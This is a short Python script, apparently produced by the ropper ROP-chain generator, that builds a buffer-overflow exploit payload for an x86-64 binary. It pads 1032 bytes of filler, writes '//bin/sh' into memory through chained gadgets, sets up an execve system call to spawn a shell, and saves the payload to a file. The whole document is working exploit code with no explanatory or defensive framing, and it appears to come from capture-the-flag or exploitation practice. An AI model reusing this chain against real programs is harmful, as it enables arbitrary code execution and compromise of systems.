#!/usr/bin/env python
# Generated by ropper ropchain generator #
from struct import pack

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = 0x0000000000400000 # 95fd123f83e8d4235fb2e3463ec369da68685c2479a0cb62baa251165484d22c
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = ''

rop += rebase_0(0x000000000000dafb) # 0x000000000040dafb: pop r13; ret; 
rop += '//bin/sh'
rop += rebase_0(0x0000000000000686) # 0x0000000000400686: pop rdi; ret; 
rop += rebase_0(0x00000000002b90e0)
rop += rebase_0(0x0000000000068759) # 0x0000000000468759: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x000000000000dafb) # 0x000000000040dafb: pop r13; ret; 
rop += p(0x0000000000000000)
rop += rebase_0(0x0000000000000686) # 0x0000000000400686: pop rdi; ret; 
rop += rebase_0(0x00000000002b90e8)
rop += rebase_0(0x0000000000068759) # 0x0000000000468759: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000000686) # 0x0000000000400686: pop rdi; ret; 
rop += rebase_0(0x00000000002b90e0)
rop += rebase_0(0x00000000000101f3) # 0x00000000004101f3: pop rsi; ret; 
rop += rebase_0(0x00000000002b90e8)
rop += rebase_0(0x000000000004be16) # 0x000000000044be16: pop rdx; ret; 
rop += rebase_0(0x00000000002b90e8)
rop += rebase_0(0x0000000000015664) # 0x0000000000415664: pop rax; ret; 
rop += p(0x000000000000003b)
rop += rebase_0(0x0000000000074e65) # 0x0000000000474e65: syscall; ret; 

buffer = "A"*1024 + "B" * 8
open('rop','w').write(buffer + rop + "\n")

